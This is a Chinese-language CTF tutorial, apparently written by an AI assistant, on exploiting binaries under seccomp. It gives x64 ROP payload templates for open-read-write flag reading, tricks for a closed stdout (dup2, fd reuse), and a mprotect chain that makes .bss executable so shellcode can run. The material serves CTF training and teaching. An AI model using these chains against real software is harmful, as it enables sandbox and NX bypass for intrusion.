# CTF 专题笔记：seccomp 下 ORW 与 mprotect 赋予 bss 可执行权限

> 适用范围：仅限 CTF、教学与授权靶场。
> 
> 目标：当 `execve` 被 seccomp 限制后，依然稳定读出 flag；或在需要执行自定义代码时，通过 `mprotect` 调整页权限。

## 1. 背景与核心思路

在很多 PWN 题中，攻击流程会被沙盒限制：

- 禁掉 `execve`、`system` 相关路径，导致传统拿 shell 失败。
- 允许一部分基础系统调用（常见 `read`、`write`、有时 `open/openat`）。

这时常用两条路：

1. ORW：不再追求 shell，直接 `open -> read -> write` 打印 flag。
2. mprotect 路径：把某段内存改成可执行，再执行放进去的 shellcode 或小型代码片段。

---

## 2. seccomp 下 ORW 利用教程

## 2.1 ORW 是什么

ORW 是三个动作：

1. `open("./flag", O_RDONLY)` 或 `openat(...)`
2. `read(fd, buf, size)`
3. `write(1, buf, size)`

本质是“文件读取型利用”，不是“交互 shell 型利用”。

## 2.2 赛前判断清单

拿到题后先确认：

1. 是否存在可控控制流：栈溢出、堆 hook 劫持、UAF 等。
2. seccomp 允许了哪些 syscall：
   - 可用工具：`seccomp-tools dump ./chall`。
3. 是否有可写缓冲区：`.bss`、heap、可控栈区。
4. 是否有足够 gadget：`pop rdi/rsi/rdx/rax; ret`、`syscall; ret`（x64）或 `int 0x80`（x86）。
5. 文件路径如何构造：`./flag`、`/flag`、`/home/ctf/flag`。

## 2.3 64 位 Linux 常见 syscall 约定

`syscall` 指令下常见寄存器：

- `rax`：系统调用号
- `rdi`：参数 1
- `rsi`：参数 2
- `rdx`：参数 3
- `r10`：参数 4
- `r8`：参数 5
- `r9`：参数 6

常用调用号（不同内核/架构请复核）：

- `open`：2
- `read`：0
- `write`：1
- `openat`：257

## 2.4 ORW 通用 ROP 模板（x64）

```python
# 仅示意模板，地址需按题目替换
payload  = b"A" * offset

# open("./flag", 0, 0)
payload += p64(pop_rdi) + p64(flag_path_addr)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(pop_rax) + p64(2)
payload += p64(syscall_ret)

# read(fd, buf, 0x100)
# 常见偷懒法：fd 直接假设为 3（很多题可行，但非绝对）
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(buf_addr)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(pop_rax) + p64(0)
payload += p64(syscall_ret)

# write(1, buf, 0x100)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(buf_addr)
payload += p64(pop_rdx) + p64(0x100)
payload += p64(pop_rax) + p64(1)
payload += p64(syscall_ret)
```

## 2.5 ORW 常见坑位

1. seccomp 可能禁了 `open` 但放行了 `openat`。
2. `fd=3` 不是永远成立，必要时要处理真实返回值。
3. 路径字符串必须可读且以 `\x00` 结尾。
4. 栈对齐和 gadget 副作用会导致链子中途崩溃。
5. 标准输出可能被重定向，必要时改写到已知可见通道。

## 2.6 stdout 被关闭/重定向时如何处理

有些题目会故意 `close(1)` 或把 `stdout` 指到不可见位置，导致你 ORW 后看不到输出。常见处理方式如下。

### 情况 A：`dup2/dup3` 可用（最稳）

思路是把一个“可见 fd”复制到 `1`（标准输出）：

1. 先拿到可见 fd：
   - 远程题通常网络连接对应某个 socket fd（如 4）。
   - 本地可尝试 `open("/dev/tty", O_WRONLY)` 获取终端 fd。
2. 调用 `dup2(vis_fd, 1)`，必要时再 `dup2(vis_fd, 2)`。
3. 之后 `write(1, buf, n)` 就能正常回显。

示意（伪代码）：

```text
dup2(vis_fd, 1)
dup2(vis_fd, 2)
write(1, buf, n)
```

### 情况 B：seccomp 禁了 `dup2/dup3`

可以用“关闭后复用最小 fd”技巧：

1. 先 `close(1)`。
2. 再 `open/openat` 一个可见目标（如 `/dev/tty` 或当前连接相关设备）。
3. 因为内核会优先分配最小可用 fd，新打开的 fd 往往就是 `1`。
4. 后续直接 `write(1, buf, n)`。

注意：这个技巧依赖环境，若 `0/1/2` 状态不一致，返回 fd 不一定是 1，需要在利用中做分支判断。

### 情况 C：stdout 不可见但 stderr 可见

有些环境只关了 `1`，但 `2` 还在：

1. 可直接把 ORW 的最后一步改为 `write(2, buf, n)`。
2. 或先把 `2` 复制到 `1`，再统一走 `write(1, ...)`。

### 比赛中推荐的排障顺序

1. 先试 `write(1, ...)` 和 `write(2, ...)` 哪个可见。
2. 再判断 seccomp 是否放行 `dup2/dup3`。
3. 可用则优先 `dup2`，不可用再用 `close(1)+open` 复用策略。
4. 无法确定连接 fd 时，给 exp 增加多候选 fd 探测（例如 3 到 8）。

---

## 3. mprotect 让 bss 可执行教程

## 3.1 什么时候需要 mprotect

当题目需要执行你自己写入的代码（shellcode）但目标内存不可执行时，可以：

1. 先把 shellcode 写到可写区（如 `.bss`）。
2. 调 `mprotect` 把该页改成 `RWX` 或至少 `RX`。
3. 跳转到 shellcode 地址执行。

## 3.2 mprotect 关键参数

原型：

```c
int mprotect(void *addr, size_t len, int prot);
```

关键点：

1. `addr` 必须页对齐（通常 0x1000 对齐）。
2. `len` 建议覆盖足够范围，如 `0x1000`。
3. `prot` 常见取值：
   - `PROT_READ = 1`
   - `PROT_WRITE = 2`
   - `PROT_EXEC = 4`
   - `RWX = 7`

页对齐计算常用：

```python
page = bss_addr & ~0xfff
```

## 3.3 mprotect + shellcode 典型链路

比赛常见顺序：

1. 利用漏洞获得 ROP 控制权。
2. 调用 `read(0, bss, 0x400)` 把第二阶段 shellcode 读入 `.bss`。
3. 调用 `mprotect(page_align(bss), 0x1000, 7)`。
4. 控制流跳到 `bss` 执行 shellcode。

## 3.4 64 位示意模板

```python
# 第 1 段：先读入二阶段代码到 bss
payload  = b"A" * offset
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss_addr)
payload += p64(pop_rdx) + p64(0x400)
payload += p64(read_plt)

# 第 2 段：mprotect(bss_page, 0x1000, 7)
payload += p64(pop_rdi) + p64(bss_addr & ~0xfff)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(mprotect_plt)

# 第 3 段：跳到 bss 执行
payload += p64(bss_addr)
```

## 3.5 mprotect 路径常见坑位

1. 地址未页对齐，`mprotect` 直接失败。
2. seccomp 可能限制 `mprotect`。
3. 长度覆盖不足，跳转位置仍在不可执行页。
4. DEP/NX 与沙盒组合下，需要先确认 syscall/plt 是否可达。

---

## 4. ORW 与 mprotect 的选择建议

优先级建议：

1. 能 ORW 就先 ORW：链短、稳定、符合“拿 flag 即成功”。
2. ORW 不通再考虑 mprotect：适合需要执行复杂逻辑的题。
3. 遇到“只能打一跳”的堆题，可结合 `setcontext`/栈迁移再接 ORW 或 mprotect 链。

---

## 5. 实战速查表

1. 先 dump seccomp 白名单，确认可用 syscall。
2. 再定路线：ORW 还是 mprotect。
3. 确认可写区和页对齐参数。
4. 检查 gadget 副作用和栈平衡。
5. 本地调通后再上远程，注意路径差异。

---

## 6. 练习建议

1. 同一题分别写 ORW 版与 mprotect 版 exp。
2. 把路径从 `./flag` 改成多种候选，做自动回退。
3. 对 `open/openat` 做双分支模板，提升通用性。

如果你愿意，我可以下一步再给你补一版“32 位 int 0x80 风格”的 ORW 与 mprotect 对照模板，直接放进同一份文档末尾作为附录。